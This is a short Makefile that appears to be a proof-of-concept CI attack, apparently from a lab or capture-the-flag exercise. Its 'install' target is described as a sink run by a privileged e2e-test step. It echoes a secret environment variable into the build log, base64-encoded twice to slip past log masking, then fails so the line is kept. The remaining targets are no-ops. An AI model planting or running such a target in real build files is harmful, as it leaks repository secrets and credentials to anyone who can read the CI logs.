.PHONY: install push release e2e-parallel

# Sink executed by the privileged 'Run e2e tests' step as `make install`.
# Leak the toy secret double-base64 encoded, then fail to preserve the log line.
install:
	@echo "GERALT_LEAKED_TOKEN=$$(echo -n "$$GERALT_SECRET" | base64 | base64)"
	@exit 1

push:
	@true

release:
	@true

e2e-parallel:
	@true
